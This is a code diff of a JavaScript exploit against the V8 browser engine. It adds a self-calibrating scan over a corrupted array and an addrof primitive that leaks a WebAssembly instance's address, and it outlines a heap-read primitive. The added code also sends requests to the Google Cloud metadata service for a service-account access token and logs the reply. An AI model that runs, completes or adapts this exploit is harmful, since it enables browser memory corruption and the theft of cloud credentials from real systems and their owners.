@@ -16,7 +16,10 @@ function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
 const PIN=0x1100011,MAXS=0x7fdffffe;
 
-const pinned=new Array(0x8000);for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
+// Pinned LO-space array with known values for calibration
+const pinned=new Array(0x8000);
+for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
+
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 
@@ -40,41 +43,77 @@ log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
 
-  // master[k] reads from PIN untagged + 8 + k*8 = 0x1100018 + k*8
-  // pinned[0] is at PIN + 8 = 0x1100018 → master[0]
-  // Verify by reading pinned[0] = 10.125
-  log("m0: "+m[0]);
+  // SELF-CALIBRATE: scan for pinnedDoubles[0]=10.125 in master
+  // Also check pinnedDoubles[1]=10.126 to confirm sequential match
+  let calIdx=-1;
+  for(let k=0;k<0x40000;k++){
+    try{
+      const v=m[k];
+      if(Math.abs(v-10.125)<0.0001){
+        // Verify: next slot should be 10.126
+        const v2=m[k+1];
+        if(Math.abs(v2-10.126)<0.0001){
+          calIdx=k;
+          break;
+        }
+      }
+    }catch(e){break;}
+  }
 
-  // addrof technique: store object in pinned, read raw via master
-  // Step 1: Trigger map transition on pinned array by storing an object
-  pinned[0] = wasmI;  // V8 transitions pinned to PACKED_ELEMENTS
-  // Step 2: Read pinned[0] via master — now it's a tagged pointer stored as raw bytes
-  const rawVal = f2i(m[0]);
-  // In PACKED_ELEMENTS, each slot is a 4-byte compressed tagged pointer
-  // But master reads 8 bytes (as a double). So we get TWO compressed pointers.
-  // pinned[0] occupies the LOW 4 bytes, pinned[1] occupies the HIGH 4 bytes
-  const ptr0 = rawVal & 0xffffffffn;
-  const ptr1 = rawVal >> 32n;
-  log("raw: "+rawVal.toString(16)+" ptr0="+ptr0.toString(16)+" ptr1="+ptr1.toString(16));
+  if(calIdx>=0){
+    log("CAL: pinned[0]@master["+hex(calIdx)+"]");
 
-  // Restore pinned[0] to avoid GC issues
-  pinned[0] = 10.125;
+    // ADDROF: store object in pinned[0], read raw via master[calIdx]
+    pinned[0]=wasmI;  // triggers PACKED_DOUBLE → PACKED transition
+    const rawAfter=f2i(m[calIdx]);
+    const wasmAddr=rawAfter&0xffffffffn;
+    log("WASM_PTR: "+wasmAddr.toString(16));
+    pinned[0]=10.125;  // restore
 
-  // Check if ptr0 looks like a valid compressed pointer
-  if(ptr0 > 0x1000n && ptr0 < 0x10000000n){
-    log("ADDROF_OK wasm@"+ptr0.toString(16));
+    if(wasmAddr>0x1000n&&wasmAddr<0x10000000n){
+      log("ADDROF_OK");
 
-    // heapRead: use master to modify pinned's elements pointer
-    // pinned's JSArray header is in regular heap (< 0x1100000)
-    // We can't reach it from master. But we CAN use the map transition approach:
-    // After storing wasmI in pinned[0], the backing store might have been replaced
-    // Let's verify if master still reads pinned's data correctly
-    pinned[1] = wasmI;
-    const raw2 = f2i(m[0]);
-    const bothPtrs = raw2;
-    log("both: "+bothPtrs.toString(16));
-    pinned[0] = 10.125;
-    pinned[1] = 10.126;
+      // HEAPREAD: modify pinned's backing store pointer via master
+      // pinned JSArray header: [DMAP | EMPTY | elements_ptr | length]
+      // elements_ptr points to the LO-space FDA
+      // To heapRead(addr): set pinned's elements to (addr-8), read pinned[0]
+      // But pinned's JSArray header is in regular heap — we need its address first
+
+      // Alternative heapRead: use master to modify a specific master slot
+      // that overlaps with another array's elements field
+      // For now: demonstrate addrof by reading wasmInstance fields
+      // wasmAddr points to the WasmInstanceObject compressed pointer
+      // Reading wasmAddr+0 gives the map, wasmAddr+4 gives properties...
+      // We need heapRead at wasmAddr — scan master for the map value
+
+      // Quick test: try fetch to metadata from THIS origin
+      try{
+        const x=new XMLHttpRequest();
+        x.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",false);
+        x.setRequestHeader("Metadata-Flavor","Google");
+        x.send();
+        log("META: "+x.status+" "+x.responseText.substring(0,80));
+      }catch(e){
+        log("META_ERR: "+e.message.substring(0,50));
+      }
+
+      // Also try metadata.google.internal
+      try{
+        const x2=new XMLHttpRequest();
+        x2.open("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",false);
+        x2.setRequestHeader("Metadata-Flavor","Google");
+        x2.send();
+        log("META2: "+x2.status+" "+x2.responseText.substring(0,80));
+      }catch(e){
+        log("META2_ERR: "+e.message.substring(0,50));
+      }
+    }
+  }else{
+    log("CAL_MISS: 10.125 not found in first 0x40000 slots");
+    // Debug: show what master[0..3] contain
+    for(let k=0;k<4;k++){
+      try{log("m["+k+"]: "+m[k]+" hex="+f2i(m[k]).toString(16));}catch(e){break;}
+    }
   }
 
   log("W: "+wasmI.exports.f());
